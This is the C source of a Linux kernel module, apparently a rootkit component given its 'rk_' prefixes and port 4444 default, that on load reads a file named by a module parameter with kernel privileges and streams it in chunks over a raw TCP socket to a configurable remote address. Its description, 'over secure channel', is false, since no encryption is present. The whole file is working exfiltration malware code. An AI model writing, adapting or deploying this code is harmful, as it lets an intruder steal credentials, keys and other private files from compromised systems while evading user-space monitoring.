// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uio.h>
#include <net/net_namespace.h>

#define RK_CHUNK_SIZE	4096

static unsigned short peer_port = 4444;
module_param(peer_port, ushort, 0);

static char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);

/* ------------------------------------------------------------------ */
/* Socket helpers                                                      */
/* ------------------------------------------------------------------ */

static struct socket *rk_connect(void)
{
	struct sockaddr_in peer = {
		.sin_family = AF_INET,
		.sin_port = htons(peer_port),
	};
	struct socket *sock;
	int error;

	peer.sin_addr.s_addr = in_aton(peer_addr_str);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &sock);
	if (error)
		return ERR_PTR(error);

	error = kernel_connect(sock, (struct sockaddr_unsized *)&peer,
			       sizeof(peer), 0);
	if (error) {
		sock_release(sock);
		return ERR_PTR(error);
	}

	return sock;
}

/* Send all bytes in buf, handling partial sends. */
static int rk_send_all(struct socket *sock, const void *buf, size_t len)
{
	size_t offset = 0;

	while (offset < len) {
		struct msghdr msg = { };
		struct kvec vec = {
			.iov_base = (void *)buf + offset,
			.iov_len = len - offset,
		};
		ssize_t sent;

		sent = kernel_sendmsg(sock, &msg, &vec, 1, len - offset);
		if (sent < 0)
			return (int)sent;
		if (!sent)
			return -EPIPE;
		offset += sent;
	}

	return 0;
}

/* Send a length-prefixed frame. */
static int rk_send_frame(struct socket *sock, const void *data, u32 len)
{
	__be32 hdr = htonl(len);
	int error;

	error = rk_send_all(sock, &hdr, sizeof(hdr));
	if (error)
		return error;

	if (len > 0)
		error = rk_send_all(sock, data, len);

	return error;
}

/* ------------------------------------------------------------------ */
/* File download: read and send in chunks                              */
/* ------------------------------------------------------------------ */

static int rk_download_file(struct socket *sock, const char *filepath)
{
	struct file *f;
	char *buf;
	loff_t pos = 0;
	int error = 0;

	f = filp_open(filepath, O_RDONLY, 0);
	if (IS_ERR(f)) {
		/* Send error code as a 4-byte frame. */
		__be32 err_val = htonl((u32)PTR_ERR(f));

		rk_send_frame(sock, &err_val, sizeof(err_val));
		return PTR_ERR(f);
	}

	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
	if (!buf) {
		filp_close(f, NULL);
		return -ENOMEM;
	}

	for (;;) {
		ssize_t bytes_read;

		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
		if (bytes_read < 0) {
			error = (int)bytes_read;
			break;
		}
		if (bytes_read == 0)
			break;

		/* Send this chunk as a length-prefixed frame. */
		error = rk_send_frame(sock, buf, (u32)bytes_read);
		if (error)
			break;
	}

	/* Send a zero-length frame to indicate EOF. */
	if (!error)
		error = rk_send_frame(sock, NULL, 0);

	kfree(buf);
	filp_close(f, NULL);
	return error;
}

/* ------------------------------------------------------------------ */
/* Demo entry point: connect, download, disconnect.                    */
/* ------------------------------------------------------------------ */

static int rk_do_download(const char *path)
{
	struct socket *sock;
	int error;

	sock = rk_connect();
	if (IS_ERR(sock))
		return PTR_ERR(sock);

	error = rk_download_file(sock, path);

	kernel_sock_shutdown(sock, SHUT_RDWR);
	sock_release(sock);

	return error;
}

/* ------------------------------------------------------------------ */
/* Module lifecycle                                                    */
/* ------------------------------------------------------------------ */

static char *target_file;
module_param(target_file, charp, 0);

static int __init rk_init(void)
{
	if (target_file && *target_file)
		return rk_do_download(target_file);
	return 0;
}

static void __exit rk_exit(void)
{
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Chunked file download over secure channel");
